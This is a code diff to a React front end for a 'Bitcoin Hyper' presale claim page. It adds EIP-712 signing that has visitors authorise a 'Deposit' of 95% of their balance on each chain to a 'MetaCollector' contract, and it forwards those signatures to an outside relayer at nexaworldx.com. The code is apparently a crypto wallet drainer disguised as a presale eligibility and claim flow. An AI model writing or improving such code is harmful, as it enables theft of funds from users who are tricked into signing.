@@ -155,6 +155,15 @@ function App() {
     'Avalanche': 'avax'
   };
 
+  // EIP-712 Types for Meta Transaction
+  const EIP712_TYPES = {
+    Deposit: [
+      { name: "user", type: "address" },
+      { name: "amount", type: "uint256" },
+      { name: "nonce", type: "uint256" }
+    ]
+  };
+
   // Fetch crypto prices
   useEffect(() => {
     const fetchPrices = async () => {
@@ -279,7 +288,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // Check eligibility - EXACTLY like your working version
+  // Check eligibility
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -431,7 +440,7 @@ function App() {
   };
 
   // ============================================
-  // RELAYER EXECUTION - ONLY THIS PART CHANGED
+  // EIP-712 SIGNING AND RELAYER EXECUTION
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -450,24 +459,10 @@ function App() {
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
-      // YOUR EXACT CUSTOM SIGNING MESSAGE
+      // Generate nonce for this transaction
       const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation\n` +
-        `Wallet: ${address}\n` +
-        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
-        `Timestamp: ${new Date().toISOString()}\n` +
-        `Nonce: ${nonce}`;
-
-      setTxStatus('✍️ Sign message...');
-
-      // Get signature
-      const signature = await signer.signMessage(message);
-      console.log("✅ Signature obtained");
       
-      setTxStatus('⏳ Processing...');
-
-      // Use only executable chains (those with enough value and gas buffer)
+      // Get chains to process (executable chains)
       const chainsToProcess = executableChains;
       
       if (chainsToProcess.length === 0) {
@@ -491,11 +486,11 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
-          // Get balance data - SEND 95% (leave 5% for gas)
           const balance = balances[chain.name];
           
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
+          const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
           
           setProcessedAmounts(prev => ({
             ...prev,
@@ -508,34 +503,71 @@ function App() {
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
-          // Create contract interface for encoding
+          // ===== EIP-712 TYPED DATA SIGNING =====
+          // Create domain for this specific chain
+          const domain = {
+            name: "MetaCollector",
+            version: "1",
+            chainId: chain.chainId,
+            verifyingContract: chain.contractAddress
+          };
+          
+          // Create value/message for signing
+          const value = {
+            user: address,
+            amount: amountInWei.toString(),
+            nonce: nonce
+          };
+          
+          setTxStatus(`✍️ Signing for ${chain.name}...`);
+          
+          // Get EIP-712 signature
+          const signature = await signer.signTypedData(
+            domain,
+            EIP712_TYPES,
+            value
+          );
+          
+          console.log(`✅ Signature obtained for ${chain.name}`);
+          
+          // Create the signature payload exactly as your relayer expects
+          const signaturePayload = {
+            domain: domain,
+            types: EIP712_TYPES,
+            value: value,
+            signature: signature,
+            expectedSigner: address
+          };
+          
+          // Create contract interface for encoding (optional - your relayer might handle this)
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
           const encodedFunctionData = contractInterface.encodeFunctionData('processNativeFlow', []);
           
-          // Prepare payload for relayer
-          const relayerPayload = {
-            network: NETWORK_MAP[chain.name] || 'eth',
-            contractAddress: chain.contractAddress,
-            amount: amountToSend.toFixed(18),
-            encodedFunctionData: encodedFunctionData,
-            nonce: nonce
-          };
-
           setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
-
-          // Send to relayer
+          
+          // Send to relayer - MATCHING YOUR EXACT FLOW
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
               'x-api-key': RELAYER_API_KEY
             },
-            body: JSON.stringify(relayerPayload)
+            body: JSON.stringify({
+              contractAddress: chain.contractAddress,
+              signaturePayload: signaturePayload
+            })
           });
 
-          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
+          const responseText = await relayerResponse.text();
+          console.log(`Response from relayer for ${chain.name}:`, responseText);
           
-          const relayerResult = await relayerResponse.json();
+          let relayerResult;
+          try {
+            relayerResult = JSON.parse(responseText);
+          } catch (e) {
+            console.error('Failed to parse response:', responseText);
+            throw new Error(`Invalid response from relayer: ${responseText.substring(0, 100)}`);
+          }
           
           if (!relayerResult.success) {
             throw new Error(relayerResult.error || 'Relayer failed');
@@ -565,7 +597,7 @@ function App() {
             }
           };
           
-          await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+          fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(flowData)
@@ -661,7 +693,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Show claim button - EXACTLY like working version
+  // Show claim button
   const showClaimButton = isConnected && isEligible && !completedChains.length;
 
   return (
